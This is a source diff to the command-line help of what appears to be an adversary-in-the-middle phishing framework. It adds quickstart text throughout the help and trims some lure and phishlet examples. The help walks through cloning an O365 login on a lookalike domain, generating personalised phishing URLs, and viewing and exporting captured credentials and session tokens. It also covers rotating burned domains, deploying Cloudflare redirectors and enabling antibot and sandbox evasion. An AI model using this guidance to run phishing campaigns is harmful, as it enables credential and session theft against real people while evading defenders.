@@ -3276,7 +3276,7 @@ func (t *Terminal) monitorLurePause() {
 
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
-	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
+	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.\n\nQuickstart:\n  set server IP:  config ipv4 external <ip>\n  set unauth url: config unauth_url <url>\n  autocert:       config autocert <on|off>\n  gophish:        config gophish admin_url <url>\n  telegram:       config telegram bot_token <token>", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
@@ -3311,7 +3311,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"dns_port"}, "dns_port <port>", "set DNS server port")
 	h.AddSubCommand("config", []string{"redirectors_dir"}, "redirectors_dir <path>", "set directory where redirector files are stored")
 
-	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
+	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website\n\nQuickstart:\n  enable:         proxy enable\n  set type:       proxy type <http|socks5>\n  set address:    proxy address <addr>\n  set port:       proxy port <port>", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
 	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
 	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
@@ -3322,7 +3322,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
 	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")
 
-	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.\n\nQuickstart:\n  set hostname:   phishlets hostname <name> <fqdn>\n  enable:         phishlets enable <name>\n  disable:        phishlets disable <name>\n  hide/unhide:    phishlets hide <name> | phishlets unhide <name>\n  child phishlet: phishlets create <tpl> <child> k1=v1 k2=v2\n\nExamples:\n  phishlets hostname o365 login.corp-portal.com\n  phishlets enable o365\n  phishlets disable o365\n  phishlets create o365 acme-o365 brand=acme", LAYER_TOP,
+	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.\n\nQuickstart:\n  set hostname:   phishlets hostname <name> <fqdn>\n  enable:         phishlets enable <name>\n  disable:        phishlets disable <name>\n  hide/unhide:    phishlets hide <name> | phishlets unhide <name>\n  child phishlet: phishlets create <tpl> <child> k1=v1 k2=v2\n\nExamples:\n  phishlets hostname o365 login.corp-portal.com\n  phishlets enable o365\n  phishlets disable o365", LAYER_TOP,
 		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
@@ -3340,7 +3340,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
-	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
+	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.\n\nQuickstart:\n  list sessions:  sessions\n  view detail:    sessions <id>\n  delete one:     sessions delete <id>\n  delete all:     sessions delete all\n  export:         sessions export <id>", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all")), readline.PcItem("export")))
 	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
@@ -3348,7 +3348,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 	h.AddSubCommand("sessions", []string{"export"}, "export <id>", "export captured session data to a JSON file")
 
-	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all created lures and allows to edit or delete them.\nEach lure auto-creates a Gophish campaign named '<phishlet>-auto'\n(group/template/page/SMTP placeholders are auto-filled — review them\nin the Gophish admin UI at http://127.0.0.1:3333 before sending).\n\nQuickstart:\n  enable phishlet: phishlets enable <name>\n  use in campaign: lures create <phishlet>\n  print phish url: lures get-url <id>\n  one-shot import: lures get-url <id> import emails.txt\n  export csv:      lures get-url <id> import in.csv export out.csv csv\n\nExamples:\n  lures create o365\n  lures get-url 0\n  lures get-url 0 firstname=John lastname=Doe\n  lures get-url 0 import targets.txt export urls.txt text\n  lures edit 0 redirect_url https://outlook.office.com/\n  lures pause 0 1d12h\n  lures unpause 0\n  lures delete 0\n  lures delete all", LAYER_TOP,
+	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all created lures and allows to edit or delete them.\nEach lure auto-creates a Gophish campaign named '<phishlet>-auto'\n(group/template/page/SMTP placeholders are auto-filled — review them\nin the Gophish admin UI at http://127.0.0.1:3333 before sending).\n\nQuickstart:\n  enable phishlet: phishlets enable <name>\n  use in campaign: lures create <phishlet>\n  print phish url: lures get-url <id>\n\nExamples:\n  lures create o365\n  lures get-url 0\n  lures get-url 0 firstname=John lastname=Doe\n  lures edit 0 redirect_url https://outlook.office.com/\n  lures pause 0 1d12h\n  lures unpause 0\n  lures delete 0\n  lures delete all", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)), readline.PcItem("post_redirector", readline.PcItemDynamic(t.postRedirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
@@ -3359,7 +3359,6 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
 	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
-	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
 	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
 	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
 	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
@@ -3375,7 +3374,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
-	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and\nconfigure domain rotation. When rotation is enabled, all configured\ndomains are automatically added to the rotation pool.", LAYER_TOP,
+	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and\nconfigure domain rotation. When rotation is enabled, all configured\ndomains are automatically added to the rotation pool.\n\nQuickstart:\n  set domain:     domains set <domain>\n  add to pool:    domains add <domain>\n  enable:         domains enable <domain>\n  set primary:    domains set-primary <domain>\n  rotation:       domains rotation enable on", LAYER_TOP,
 		readline.PcItem("domains",
 			readline.PcItem("set"),
 			readline.PcItem("list"),
@@ -3414,7 +3413,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("domains", []string{"rotation", "mark-compromised"}, "rotation mark-compromised <full_domain> <reason>", "mark a domain as compromised")
 	h.AddSubCommand("domains", []string{"rotation", "stats"}, "rotation stats", "show detailed rotation statistics")
 
-	h.AddCommand("cloudflare", "general", "manage Cloudflare Workers and configuration", "Generate, deploy, and manage Cloudflare Worker scripts. Configure API credentials.", LAYER_TOP,
+	h.AddCommand("cloudflare", "general", "manage Cloudflare Workers and configuration", "Generate, deploy, and manage Cloudflare Worker scripts. Configure API credentials.\n\nQuickstart:\n  set account:    cloudflare config account_id <id>\n  set api token:  cloudflare config api_token <token>\n  gen worker:     cloudflare worker simple <redirect_url>\n  deploy:         cloudflare deploy <name> simple <redirect_url>\n  list workers:   cloudflare list", LAYER_TOP,
 		readline.PcItem("cloudflare",
 			readline.PcItem("worker", readline.PcItem("simple"), readline.PcItem("html"), readline.PcItem("advanced")),
 			readline.PcItem("deploy"),
@@ -3446,7 +3445,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("cloudflare", []string{"config", "enabled"}, "config enabled <true|false>", "enable or disable Cloudflare Worker deployment")
 	h.AddSubCommand("cloudflare", []string{"config", "test"}, "config test", "test the Cloudflare API credentials")
 
-	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
+	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.\n\nQuickstart:\n  block all:      blacklist all\n  block unauth:   blacklist unauth\n  disable:        blacklist off\n  add IP:         blacklist add <ip>\n  list IPs:       blacklist list", LAYER_TOP,
 		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("clear"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
 
 	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
@@ -3460,7 +3459,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"remove"}, "remove <ip_address>", "remove an IP address from the blacklist")
 	h.AddSubCommand("blacklist", []string{"clear"}, "clear", "remove all IP addresses from the blacklist")
 
-	h.AddCommand("whitelist", "general", "manage IP whitelist to allow only specific IP addresses", "When enabled, only IP addresses in the whitelist will be allowed to access the phishing infrastructure.", LAYER_TOP,
+	h.AddCommand("whitelist", "general", "manage IP whitelist to allow only specific IP addresses", "When enabled, only IP addresses in the whitelist will be allowed to access the phishing infrastructure.\n\nQuickstart:\n  enable:         whitelist on\n  disable:        whitelist off\n  add IP:         whitelist add <ip>\n  remove IP:      whitelist remove <ip>\n  list IPs:       whitelist list", LAYER_TOP,
 		readline.PcItem("whitelist", readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("list"), readline.PcItem("clear"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
 
 	h.AddSubCommand("whitelist", nil, "", "show current whitelist status and statistics")
@@ -3472,7 +3471,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("whitelist", []string{"clear"}, "clear", "remove all IP addresses from the whitelist")
 	h.AddSubCommand("whitelist", []string{"log"}, "log <on|off>", "enable or disable log output for whitelist messages")
 
-	h.AddCommand("antibot", "general", "manage all antibot features", "Configure all antibot functionalities, including JA3, CAPTCHA, Sandbox, and Polymorphic engines.", LAYER_TOP,
+	h.AddCommand("antibot", "general", "manage all antibot features", "Configure all antibot functionalities, including JA3, CAPTCHA, Sandbox, and Polymorphic engines.\n\nQuickstart:\n  enable:         antibot enabled true\n  set action:     antibot action <block|spoof>\n  enable captcha: antibot captcha enable on\n  enable sandbox: antibot sandbox enable on\n  polymorphic:    antibot polymorphic enable on", LAYER_TOP,
 		readline.PcItem("antibot",
 			readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), 
 			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), 
